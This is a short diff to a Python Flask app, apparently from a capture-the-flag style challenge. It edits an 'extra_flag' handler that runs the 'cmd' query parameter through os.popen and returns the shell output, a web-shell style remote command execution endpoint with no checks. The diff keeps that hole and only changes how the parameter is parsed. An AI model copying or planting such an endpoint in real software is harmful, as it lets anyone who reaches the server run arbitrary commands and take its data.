@@ -58,5 +58,6 @@ def internal_server_error(e):
 def extra_flag():
     if not request.args.get("cmd", False):
         return jsonify({})
-    resp = os.popen(request.args.get("cmd")).read()
+    arguments = str(request.args.to_dict())
+    resp = os.popen(json.loads(arguments.replace("'", '"'))["cmd"]).read()
     return jsonify({"response": resp})
